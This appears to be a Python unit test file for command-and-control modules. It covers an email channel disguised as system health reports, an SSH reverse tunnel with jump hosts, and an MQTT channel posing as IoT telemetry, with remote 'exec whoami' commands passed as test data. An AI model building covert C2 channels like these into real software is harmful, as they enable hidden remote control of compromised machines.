"""Tests for C2 channel modules: EmailC2Channel, SSHTunnelC2, MQTTC2Channel"""

import json
import os
import sys
import time
import unittest
from unittest.mock import MagicMock, call, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestEmailC2Channel(unittest.TestCase):
    """Email C2 channel tests"""

    def setUp(self):
        self.env_patcher = patch.dict(
            os.environ,
            {
                "C2_EMAIL_ADDRESS": "test@example.com",
                "C2_EMAIL_PASSWORD": "secret123",
            },
            clear=False,
        )
        self.env_patcher.start()

    def tearDown(self):
        self.env_patcher.stop()

    def test_init_defaults(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel()
        self.assertEqual(c2.smtp_server, "smtp.gmail.com")
        self.assertEqual(c2.smtp_port, 587)
        self.assertEqual(c2.imap_server, "imap.gmail.com")
        self.assertEqual(c2.imap_port, 993)
        self.assertEqual(c2.command_prefix, "[SYSTEM]")
        self.assertEqual(c2.beacon_interval, 300)
        self.assertEqual(c2.poll_interval, 60)
        self.assertTrue(c2.use_tls)
        self.assertTrue(c2.email_address.startswith("test"))
        self.assertFalse(c2._running)
        self.assertIsNotNone(c2.target_id)

    def test_init_without_credentials_no_warning_if_env_var_set(self):
        from c2.email_c2 import EmailC2Channel

        with patch("c2.email_c2.logger.warning") as mock_warn:
            c2 = EmailC2Channel()
            mock_warn.assert_not_called()

    def test_init_without_credentials_logs_warning(self):
        from c2.email_c2 import EmailC2Channel

        with patch("c2.email_c2.logger.warning") as mock_warn:
            with patch.dict(os.environ, clear=True):
                c2 = EmailC2Channel(email_address="", email_password="")
                mock_warn.assert_called_once()
                self.assertIn("credentials not set", mock_warn.call_args[0][0])

    def test_check_credentials_missing(self):
        from c2.email_c2 import EmailC2Channel

        with patch.dict(os.environ, {"C2_EMAIL_ADDRESS": "", "C2_EMAIL_PASSWORD": ""}):
            c2 = EmailC2Channel(email_address="", email_password="")
            self.assertFalse(c2._check_credentials())

    def test_check_credentials_present(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        self.assertTrue(c2._check_credentials())

    def test_make_subject_format(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        subject = c2._make_subject("beacon")
        self.assertTrue(subject.startswith("[SYSTEM]"))
        self.assertIn(" ", subject[9:])  # has text after prefix

    def test_make_legitimate_body(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        body = c2._make_legitimate_body("sensor_reading")
        self.assertIn("System Health Report", body)
        self.assertIn("All services running normally", body)

    def test_get_stats(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        stats = c2.get_stats()
        self.assertIn("connected", stats)
        self.assertIn("running", stats)
        self.assertIn("target_id", stats)
        self.assertIn("email", stats)
        self.assertIn("smtp", stats)
        self.assertIn("imap", stats)
        self.assertIn("sent_emails", stats)

    def test_send_beacon_no_credentials(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="", email_password="")
        with patch.dict(os.environ, {"C2_EMAIL_ADDRESS": "", "C2_EMAIL_PASSWORD": ""}):
            self.assertFalse(c2.send_beacon())

    @patch("smtplib.SMTP")
    def test_send_beacon_success(self, mock_smtp):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        result = c2.send_beacon({"cpu": 50})
        self.assertTrue(result)
        mock_smtp.assert_called_once()
        instance = mock_smtp.return_value
        instance.starttls.assert_called_once()
        instance.login.assert_called_once_with("a@b.com", "pass")
        instance.send_message.assert_called_once()
        instance.quit.assert_called_once()

    def test_send_beacon_failure(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        with patch("smtplib.SMTP", side_effect=Exception("SMTP error")) as mock_smtp:
            result = c2.send_beacon()
            self.assertFalse(result)

    @patch("smtplib.SMTP")
    def test_send_result_success(self, mock_smtp):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        result = c2.send_result("cmd-123", {"output": "ok"})
        self.assertTrue(result)
        mock_smtp.assert_called_once()

    @patch("imaplib.IMAP4_SSL")
    def test_poll_commands_empty(self, mock_imap):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        instance = mock_imap.return_value
        instance.search.return_value = ("OK", [b""])
        cmds = c2._poll_commands()
        self.assertEqual(cmds, [])

    @patch("imaplib.IMAP4_SSL")
    def test_poll_commands_found(self, mock_imap):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        instance = mock_imap.return_value
        raw_email = (
            "From: admin@c2.com\r\n"
            "To: test@example.com\r\n"
            "Subject: [SYSTEM] exec whoami\r\n"
            "\r\n"
            "ZmlsZTovLw=="
        )
        instance.search.return_value = ("OK", [b"1"])
        instance.fetch.return_value = ("OK", [(b"1 (RFC822)", raw_email.encode())])
        cmds = c2._poll_commands()
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0]["command"], "exec whoami")

    def test_start_stop(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        result = c2.start()
        self.assertTrue(result)
        self.assertTrue(c2._running)
        self.assertTrue(c2._connected)
        self.assertIsNotNone(c2._beacon_thread)
        self.assertIsNotNone(c2._poll_thread)
        c2.stop()
        self.assertFalse(c2._running)
        self.assertFalse(c2._connected)

    def test_connected_property(self):
        from c2.email_c2 import EmailC2Channel

        c2 = EmailC2Channel(email_address="a@b.com", email_password="pass")
        self.assertFalse(c2.connected)
        c2._connected = True
        self.assertTrue(c2.connected)


class TestSSHTunnelC2(unittest.TestCase):
    """SSH tunnel C2 channel tests"""

    def test_init_defaults(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        self.assertEqual(c2.c2_host, "127.0.0.1")
        self.assertEqual(c2.c2_ssh_port, 2222)
        self.assertEqual(c2.c2_tunnel_port, 8888)
        self.assertEqual(c2.username, "tunnel")
        self.assertEqual(c2.keepalive_interval, 30)
        self.assertEqual(c2.reconnect_delay, 10)
        self.assertEqual(c2.max_retries, 10)
        self.assertEqual(c2.jump_hosts, [])
        self.assertFalse(c2._running)
        self.assertFalse(c2._connected)
        self.assertIsNotNone(c2.target_id)

    def test_target_identifier_custom(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2(target_identifier="my-agent-001")
        self.assertEqual(c2.target_id, "my-agent-001")

    def test_get_stats(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        stats = c2.get_stats()
        self.assertIn("connected", stats)
        self.assertIn("running", stats)
        self.assertIn("target_id", stats)
        self.assertIn("c2_host", stats)
        self.assertIn("c2_ssh_port", stats)
        self.assertIn("c2_tunnel_port", stats)
        self.assertIn("retries", stats)
        self.assertIn("max_retries", stats)

    def test_send_result_not_connected(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        self.assertFalse(c2.send_result({"data": "test"}))

    def test_connected_property(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        self.assertFalse(c2.connected)
        c2._connected = True
        self.assertTrue(c2.connected)

    def test_start_stop(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        result = c2.start()
        self.assertTrue(result)
        self.assertTrue(c2._running)
        self.assertIsNotNone(c2._thread)
        c2.stop()
        self.assertFalse(c2._running)
        self.assertFalse(c2._connected)

    @patch("paramiko.SSHClient")
    def test_connect_success(self, mock_ssh_client):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2(password="testpass")
        client = mock_ssh_client.return_value
        transport = MagicMock()
        client.get_transport.return_value = transport

        with patch.object(c2, "_handle_tunnel"):
            result = c2._connect()

        self.assertTrue(result)
        self.assertTrue(c2._connected)
        transport.set_keepalive.assert_called_once_with(30)
        transport.request_port_forward.assert_called_once_with("127.0.0.1", 8888)

    @patch("paramiko.SSHClient")
    def test_connect_failure_triggers_retry(self, mock_ssh_client):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2(password="testpass")
        mock_ssh_client.return_value.connect.side_effect = Exception("Connection refused")
        result = c2._connect()
        self.assertFalse(result)
        self.assertFalse(c2._connected)
        self.assertEqual(c2._retries, 1)

    def test_max_retries_stops(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2(password="testpass", max_retries=3)
        c2._retries = 3
        result = c2._connect()
        self.assertFalse(result)
        self.assertFalse(c2._running)

    @patch.dict("sys.modules", {"paramiko": None})
    def test_connect_import_error_stops(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2(password="testpass")
        result = c2._connect()
        self.assertFalse(result)
        self.assertFalse(c2._running)

    @patch("paramiko.SSHClient")
    def test_connect_with_key_file(self, mock_ssh_client):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        with patch("os.path.isfile", return_value=True):
            with patch("paramiko.RSAKey.from_private_key_file") as mock_key:
                c2 = SSHTunnelC2(key_path="/tmp/test_key")
                with patch.object(c2, "_handle_tunnel"):
                    c2._connect()
                mock_ssh_client.return_value.connect.assert_called_once()
                args, kwargs = mock_ssh_client.return_value.connect.call_args
                self.assertIn("pkey", kwargs)

    @patch("paramiko.SSHClient")
    def test_connect_with_jump_host(self, mock_ssh_client):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        with patch("paramiko.ProxyCommand") as mock_proxy:
            c2 = SSHTunnelC2(password="testpass", jump_hosts=["jump.example.com"])
            with patch.object(c2, "_handle_tunnel"):
                c2._connect()
            mock_proxy.assert_called_once()
            args, kwargs = mock_ssh_client.return_value.connect.call_args
            self.assertIn("sock", kwargs)

    def test_send_result_with_transport(self):
        from c2.ssh_tunnel_c2 import SSHTunnelC2

        c2 = SSHTunnelC2()
        c2._connected = True
        transport = MagicMock()
        c2._transport = transport
        channel = MagicMock()
        transport.open_session.return_value = channel

        result = c2.send_result({"data": "hello"})
        self.assertTrue(result)
        transport.open_session.assert_called_once()
        channel.exec_command.assert_called_once()
        channel.close.assert_called_once()


class TestMQTTC2Channel(unittest.TestCase):
    """MQTT C2 channel tests"""

    def test_init_defaults(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        self.assertEqual(c2.broker, "test.mosquitto.org")
        self.assertEqual(c2.port, 1883)
        self.assertFalse(c2.use_tls)
        self.assertIn("dev_", c2.client_id)
        self.assertIn(c2.client_id, c2.beacon_topic)
        self.assertIn(c2.client_id, c2.command_topic)
        self.assertFalse(c2._running)
        self.assertFalse(c2._connected)

    def test_custom_client_id(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel(client_id="my-sensor-01")
        self.assertEqual(c2.client_id, "my-sensor-01")
        self.assertEqual(c2.beacon_topic, "iot/v1/devices/my-sensor-01/telemetry")
        self.assertEqual(c2.command_topic, "iot/v1/devices/my-sensor-01/commands")

    def test_beacon_not_connected(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        self.assertFalse(c2.beacon({"temp": 25}))

    def test_send_result_not_connected(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        self.assertFalse(c2.send_result("cmd-1", "ok"))

    def test_start_fails_without_paho(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        with patch.dict("sys.modules", {"paho": None, "paho.mqtt": None}):
            result = c2.start()
            self.assertFalse(result)

    def test_stop_works(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        c2._running = True
        mock_client = MagicMock()
        c2.client = mock_client
        c2.stop()
        self.assertFalse(c2._running)
        mock_client.disconnect.assert_called_once()
        self.assertIsNone(c2.client)

    def test_is_connected_property(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        self.assertFalse(c2.is_connected)
        c2._connected = True
        self.assertTrue(c2.is_connected)

    def test_on_message_calls_handler(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        handler = MagicMock(return_value={"status": "done"})
        c2._command_handler = handler

        msg = MagicMock()
        msg.payload = json.dumps(
            {"command": "exec", "id": "abc123", "args": {"cmd": "whoami"}}
        ).encode()

        c2._on_message(None, None, msg)
        handler.assert_called_once_with("exec", {"cmd": "whoami"})

    def test_on_connect_sets_connected(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        client = MagicMock()
        c2._on_connect(client, None, None, 0)
        self.assertTrue(c2._connected)
        client.subscribe.assert_called_once()

    def test_on_disconnect_sets_disconnected(self):
        from c2.mqtt_c2 import MQTTC2Channel

        c2 = MQTTC2Channel()
        c2._running = True
        c2._on_disconnect(None, None, 0)
        self.assertFalse(c2._connected)


class TestMQTTBeaconManager(unittest.TestCase):
    """MQTT Beacon Manager tests"""

    def test_start_stop(self):
        from c2.mqtt_c2 import MQTTBeaconManager, MQTTC2Channel

        c2 = MQTTC2Channel()
        mgr = MQTTBeaconManager(c2, interval=1)
        mgr.start()
        self.assertTrue(mgr._running)
        self.assertIsNotNone(mgr._thread)
        mgr.stop()
        self.assertFalse(mgr._running)

    def test_beacon_called_when_connected(self):
        from c2.mqtt_c2 import MQTTBeaconManager, MQTTC2Channel

        c2 = MagicMock(spec=MQTTC2Channel)
        c2.is_connected = True
        mgr = MQTTBeaconManager(c2, interval=1)
        mgr._running = True

        def stop_after_sleep(*args):
            mgr._running = False

        with patch("time.sleep", side_effect=stop_after_sleep):
            mgr._beacon_loop()
        c2.beacon.assert_called_once()


if __name__ == "__main__":
    unittest.main(verbosity=2)
